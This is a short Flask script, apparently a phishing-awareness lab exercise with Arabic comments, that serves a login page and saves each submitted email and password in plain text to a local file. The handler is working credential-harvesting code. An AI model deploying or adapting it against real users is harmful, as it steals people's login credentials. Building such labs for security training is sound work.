from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# صفحة تسجيل الدخول
@app.route('/')
def home():
    return render_template('index.html')

# المسار الذي يستقبل البيانات (المصيدة التعليمية)
@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # حفظ البيانات في ملف نصي لمشاهدتها
    with open("captured_data.txt", "a", encoding="utf-8") as f:
        f.write(f"Email: {email} | Password: {password}\n")
    
    # توجيه المستخدم لصفحة توعية بعد إدخال البيانات
    return "<h1>Security Lab: Data captured successfully in 'captured_data.txt'</h1>"

if __name__ == '__main__':
    app.run(debug=True, port=5000) 